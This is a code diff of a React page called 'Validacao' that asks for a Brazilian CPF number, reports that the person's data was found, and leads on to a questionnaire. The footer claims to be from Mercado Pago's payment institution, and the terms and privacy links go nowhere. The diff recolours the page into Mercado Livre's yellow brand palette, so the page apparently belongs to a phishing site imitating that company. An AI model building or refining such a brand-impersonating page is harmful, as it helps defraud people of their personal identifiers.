@@ -105,12 +105,12 @@ function Validacao() {
                 placeholder="000.000.000-00"
                 value={cpf}
                 onChange={(e) => setCpf(formatCPF(e.target.value))}
-                className="w-full border border-gray-300 rounded-md px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-[#3483FA] focus:border-transparent"
+                className="w-full border border-gray-300 rounded-md px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-[#FFE600] focus:border-transparent"
               />
               {error && <p className="text-sm text-red-600 mt-2">{error}</p>}
               <button
                 onClick={handleContinue}
-                className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md mt-6 transition-all"
+                className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 text-lg font-semibold py-4 rounded-md mt-6 transition-all"
               >
                 Continuar
               </button>
@@ -129,10 +129,10 @@ function Validacao() {
           {screen === "success" && data && (
             <>
               <div className="flex flex-col items-center mb-6">
-                <div className="w-14 h-14 rounded-full bg-[#3483FA] flex items-center justify-center mb-3">
+                <div className="w-14 h-14 rounded-full bg-[#FFE600] flex items-center justify-center mb-3">
                   <i className="fas fa-check text-white text-2xl" />
                 </div>
-                <div className="text-lg font-semibold text-[#3483FA]">
+                <div className="text-lg font-semibold text-gray-900">
                   Dados encontrados com sucesso!
                 </div>
               </div>
@@ -153,7 +153,7 @@ function Validacao() {
               </div>
               <button
                 onClick={() => navigate({ to: "/questionario" })}
-                className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md transition-all"
+                className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 text-lg font-semibold py-4 rounded-md transition-all"
               >
                 Continuar
               </button>
@@ -167,8 +167,8 @@ function Validacao() {
         <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
         <p className="mt-1">
           CNPJ: 10.573.521/0001-91 ·{" "}
-          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
-          <a href="#" className="text-[#3483FA]">Privacidade</a>
+          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
+          <a href="#" className="text-gray-900">Privacidade</a>
         </p>
       </footer>
     </div>
